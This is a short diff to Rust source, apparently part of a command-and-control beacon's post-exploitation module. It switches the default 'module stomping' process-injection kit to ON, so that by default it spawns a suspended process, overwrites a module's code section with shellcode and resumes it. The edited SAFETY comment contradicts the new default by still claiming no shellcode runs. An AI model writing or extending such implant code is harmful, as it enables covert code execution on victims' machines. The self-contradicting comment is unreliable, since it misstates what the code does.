@@ -88,15 +88,18 @@ pub trait ProcessInjectKit {
 
 /// Default process-inject kit: delegates to `crate::inject::module_stomp`
 /// (P2.1c). The stomp+resume tail there is gated (`inject::modulestomp_enabled`,
-/// default OFF), so by default this only creates a suspended sacrificial
-/// process and returns its handle — NOT executing any shellcode — until an
-/// operator arms the gate. Kept as a `ProcessInjectKit` impl so the postex
-/// `inject()` entry routes through the real data path (CreateProcessW) and the
-/// SDK `ModuleStomper` impl stays the single source for the algorithm.
+/// default **ON**), so by default this runs the full module-stomping path —
+/// spawn a suspended sacrificial process, stomp a module's `.text` with the
+/// shellcode, and resume. The operator can disarm via
+/// `set_modulestomp_enabled(false)` if the target requires a no-cross-process
+/// footprint, in which case only the suspended sacrificial process handle is
+/// returned (no shellcode executed). Kept as a `ProcessInjectKit` impl so the
+/// postex `inject()` entry routes through the real data path (CreateProcessW)
+/// and the SDK `ModuleStomper` impl stays the single source for the algorithm.
 pub struct ModuleStompKit;
 impl ProcessInjectKit for ModuleStompKit {
     fn inject(&self, spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
-        // SAFETY: single-threaded beacon context. With the stomp gate OFF
+        // SAFETY: single-threaded beacon context. With the stomp gate ON
         // (default) this only creates a suspended process — no shellcode runs.
         let h = unsafe { crate::inject::module_stomp(spawn_to, shellcode).ok()? };
         Some(InjectedHandle(h))
